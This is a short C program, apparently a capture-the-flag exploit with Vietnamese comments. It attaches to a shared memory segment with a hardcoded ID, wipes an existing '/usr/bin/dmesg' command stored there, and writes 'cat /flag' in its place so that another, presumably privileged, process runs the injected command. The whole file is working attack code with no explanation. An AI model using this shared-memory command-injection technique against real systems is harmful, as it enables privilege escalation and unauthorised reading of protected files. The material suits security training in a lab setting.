#include <sys/ipc.h>
#include <sys/shm.h>
#include <string.h>
#include <stdio.h>

int main() {
    int shmid = 2;  // ✅ Dùng đúng shared memory ID
    char *shm = shmat(shmid, NULL, 0);
    if (shm == (char *)-1) {
        perror("shmat");
        return 1;
    }

    // ✅ Xoá sạch 128 byte để tránh sót phần "/usr/bin/dmesg"
    memset(shm, 0, 128);

    // ✅ Overwrite bằng lệnh mới
    strcpy(shm, "cat /flag");

    shmdt(shm);
    return 0;
}

